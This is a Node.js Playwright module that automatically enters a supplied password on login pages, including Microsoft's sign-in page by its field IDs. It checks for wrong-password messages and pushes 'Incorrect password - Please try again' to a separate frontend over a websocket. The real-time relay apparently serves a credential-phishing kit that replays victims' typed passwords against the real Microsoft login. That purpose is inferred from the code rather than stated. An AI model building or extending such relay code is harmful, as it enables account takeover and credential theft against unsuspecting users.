/**
 * Password Handler
 * Handles password entry with wrong password detection
 */

const { sendToClient } = require('../services/websocket');
const { SELECTORS, TIMEOUTS } = require('../config/constants');

/**
 * Wrong password indicators
 */
const WRONG_PASSWORD_INDICATORS = [
    'incorrect password',
    'wrong password',
    'invalid password',
    'password is incorrect',
    'sign in failed',
    "that password doesn't look right",
    "your account or password is incorrect",
    "password is not correct"
];

/**
 * Detect wrong password on page
 * @param {Object} page - Playwright page object
 * @returns {Promise<boolean>} True if wrong password detected
 */
async function detectWrongPassword(page) {
    try {
        const pageText = await page.textContent('body').catch(() => '');
        const pageTitle = await page.title();

        const hasWrongPassword = WRONG_PASSWORD_INDICATORS.some(indicator =>
            pageText.toLowerCase().includes(indicator.toLowerCase()) ||
            pageTitle.toLowerCase().includes(indicator.toLowerCase())
        );

        return hasWrongPassword;
    } catch (error) {
        console.log('⚠️ Error detecting wrong password:', error.message);
        return false;
    }
}

/**
 * Send wrong password error to frontend
 */
function sendWrongPasswordError() {
    sendToClient({
        status: 'wrong_password',
        message: 'Incorrect password - Please try again',
        error: true
    });
    console.log('📤 Sent wrong password error to frontend');
}

/**
 * Handle password entry page - OPTIMIZED FOR SPEED
 * @param {Object} page - Playwright page object
 * @param {string} password - Password to enter
 */
async function handlePasswordEntry(page, password) {
    console.log('🔑 Handling password entry...');

    // Check for wrong password indicators first
    if (await detectWrongPassword(page)) {
        console.log('❌ Wrong password detected!');
        sendWrongPasswordError();
        return 'wrong_password';
    }

    // OPTIMIZED: Multiple selector strategies for faster password input
    const passwordSelectors = SELECTORS.PASSWORD_INPUT || [
        'input[type="password"]',
        'input[name="passwd"]',
        'input[name="password"]',
        'input[autocomplete="current-password"]',
        '#i0118', // Microsoft password field ID
        '#passwordInput',
        '.password-input'
    ];

    let passwordFilled = false;

    // Try each selector with minimal timeout
    for (const selector of passwordSelectors) {
        try {
            const passwordInput = page.locator(selector).first();

            // Quick visibility check with shorter timeout
            if (await passwordInput.isVisible({ timeout: 1000 })) {
                console.log(`🎯 Found password field with selector: ${selector}`);

                // Fast fill and verify
                await passwordInput.fill(password, { timeout: 2000 });

                // Verify it was filled
                const filledValue = await passwordInput.inputValue();
                if (filledValue === password) {
                    console.log('✅ Password entered successfully');
                    passwordFilled = true;
                    break;
                } else {
                    console.log('⚠️ Password fill verification failed, trying next selector');
                }
            }
        } catch (e) {
            // Continue to next selector
        }
    }

    if (!passwordFilled) {
        console.log('❌ Could not find or fill password field with any selector');
        return;
    }

    // OPTIMIZED: Fast sign-in button detection and click
    const signInSelectors = SELECTORS.SIGN_IN_BUTTON || [
        'button:has-text("Sign in")',
        'input[type="submit"]',
        'button[type="submit"]',
        '#idSIButton9', // Microsoft sign-in button ID
        '.signin-button',
        '.submit-button'
    ];

    let signInClicked = false;

    for (const selector of signInSelectors) {
        try {
            const signInButton = page.locator(selector).first();

            // Quick visibility check
            if (await signInButton.isVisible({ timeout: 1000 })) {
                console.log(`🎯 Found sign-in button with selector: ${selector}`);
                await signInButton.click({ timeout: 2000 });
                console.log('👆 Sign in button clicked');
                signInClicked = true;
                break;
            }
        } catch (e) {
            // Continue to next selector
        }
    }

    if (!signInClicked) {
        console.log('❌ Could not find or click sign-in button');
        return;
    }

    // OPTIMIZED: Minimal wait for wrong password detection
    try {
        // Short wait to let page process
        await page.waitForTimeout(1500);

        // Quick check for wrong password after submission
        if (await detectWrongPassword(page)) {
            console.log('❌ Wrong password detected after submission!');
            sendWrongPasswordError();
            return 'wrong_password';
        }
    } catch (e) {
        console.log('⚠️ Could not check for wrong password after submission');
    }
}

module.exports = {
    handlePasswordEntry,
    detectWrongPassword,
    sendWrongPasswordError
};

